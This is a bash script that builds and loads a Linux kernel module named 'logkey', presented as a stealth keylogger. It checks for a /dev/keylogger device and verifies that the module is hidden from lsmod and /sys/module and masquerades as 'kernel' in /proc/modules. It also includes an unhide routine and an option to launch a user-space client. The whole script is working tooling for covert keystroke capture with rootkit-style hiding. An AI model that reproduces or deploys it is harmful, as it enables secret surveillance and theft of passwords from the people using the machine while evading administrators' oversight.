#!/bin/bash

# Stealth Keylogger Module Loader
# This script loads the keylogger module with hiding techniques

set -e

echo "=== Stealth Keylogger Module Loader ==="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   print_error "This script must be run as root"
   exit 1
fi

# Build the kernel module
print_status "Building kernel module..."
cd kernel
make clean
make
if [ $? -ne 0 ]; then
    print_error "Failed to build kernel module"
    exit 1
fi
print_status "Kernel module built successfully"

# Unload existing module if loaded
if lsmod | grep -q "logkey"; then
    print_warning "Module already loaded, unloading..."
    rmmod logkey 2>/dev/null || true
elif cat /proc/modules | grep -q "kernel.*20480"; then
    print_warning "Hidden module found, unhiding and unloading..."
    if [ -f "/proc/unhide_logkey" ]; then
        echo "unhide" > /proc/unhide_logkey
        sleep 1
        rmmod logkey 2>/dev/null || true
    else
        print_error "Cannot unhide module - /proc/unhide_logkey not found"
        print_error "You may need to reboot to remove the hidden module"
        exit 1
    fi
fi

# Load the module
print_status "Loading kernel module..."
insmod logkey.ko
if [ $? -ne 0 ]; then
    print_error "Failed to load kernel module"
    exit 1
fi
print_status "Kernel module loaded successfully"

# Wait a moment for device creation
sleep 1

# Check if device was created
if [ -e "/dev/keylogger" ]; then
    print_status "Device file created: /dev/keylogger"
    
    # Set permissions (only root can access)
    chmod 600 /dev/keylogger
    print_status "Device permissions set to 600 (root only)"
    
    # Hide device from normal detection
    print_status "Applying stealth techniques..."
    
    # Change device name in /proc/devices to something innocuous
    # This is handled by the module itself
    
    # Create a symlink with innocuous name (optional)
    # ln -sf /dev/keylogger /dev/random 2>/dev/null || true
    
    print_status "Stealth techniques applied"
    
else
    print_error "Device file not created"
    exit 1
fi

# Verify module is hidden
print_status "Verifying stealth status..."
echo ""

# Check /proc/modules (should show as 'kernel' instead of 'logkey')
echo "Checking /proc/modules:"
if grep -q "kernel" /proc/modules; then
    print_status "Module appears as 'kernel' in /proc/modules"
else
    print_warning "Module still visible in /proc/modules"
fi

# Check lsmod
echo "Checking lsmod:"
if lsmod | grep -q "logkey"; then
    print_warning "Module visible in lsmod output"
else
    print_status "Module hidden from lsmod"
fi

# Check /sys/module
echo "Checking /sys/module:"
if [ -d "/sys/module/logkey" ]; then
    print_warning "Module visible in /sys/module"
else
    print_status "Module hidden from /sys/module"
fi

# Check device file
echo "Checking device file:"
if [ -e "/dev/keylogger" ]; then
    print_status "Device file exists: /dev/keylogger"
    ls -la /dev/keylogger
else
    print_error "Device file not found"
fi

echo ""
print_status "Keylogger module loaded and hidden successfully!"
print_status "Device file: /dev/keylogger (root access only)"
print_status "Use 'rmmod logkey' to unload the module"

# Optional: Start the user-space client
read -p "Do you want to start the user-space client? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    print_status "Starting user-space client..."
    cd ../user
    ./logkey_client
fi 